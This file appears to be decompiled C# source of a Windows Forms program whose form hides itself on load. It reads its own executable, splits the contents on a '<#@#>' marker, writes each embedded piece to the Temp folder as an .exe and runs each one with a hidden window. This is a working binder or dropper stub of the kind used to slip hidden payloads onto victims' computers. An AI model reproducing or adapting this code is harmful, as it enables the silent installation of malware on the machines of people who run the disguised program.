using System;
using System.ComponentModel;
using System.Diagnostics;
using System.Windows.Forms;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;

namespace WindowsApplication1;

[DesignerGenerated]
public class Form1 : Form
{
	private IContainer components;

	[DebuggerNonUserCode]
	public Form1()
	{
		((Form)this).add_Load((EventHandler)Form1_Load);
		InitializeComponent();
	}

	[DebuggerNonUserCode]
	protected override void Dispose(bool disposing)
	{
		if (disposing && components != null)
		{
			components.Dispose();
		}
		((Form)this).Dispose(disposing);
	}

	[DebuggerStepThrough]
	private void InitializeComponent()
	{
		components = new Container();
		((ContainerControl)this).set_AutoScaleMode((AutoScaleMode)1);
		((Form)this).set_Text("Form1");
	}

	private void Form1_Load(object sender, EventArgs e)
	{
		((Control)this).Hide();
		FileSystem.FileCopy(Application.get_ExecutablePath(), "\\files2.exe");
		FileSystem.FileOpen(1, "\\files2.exe", (OpenMode)32, (OpenAccess)(-1), (OpenShare)(-1), -1);
		checked
		{
			string text = Strings.Space((int)FileSystem.LOF(1));
			FileSystem.FileGet(1, ref text, -1L, false);
			FileSystem.FileClose(new int[1] { 1 });
			string[] array = Strings.Split(text, "<#@#>", -1, (CompareMethod)0);
			int num = Information.UBound((Array)array, 1) - 1;
			for (int i = 1; i <= num; i++)
			{
				FileSystem.FileOpen(1, Interaction.Environ("Temp") + "\\files" + Conversions.ToString(i) + ".exe", (OpenMode)32, (OpenAccess)(-1), (OpenShare)(-1), -1);
				FileSystem.FilePut(1, array[i], -1L, false);
				FileSystem.FileClose(new int[1] { 1 });
				Interaction.Shell(Interaction.Environ("temp") + "\\files" + Conversions.ToString(i) + ".exe", (AppWinStyle)0, true, -1);
			}
			((Form)this).Close();
		}
	}
}
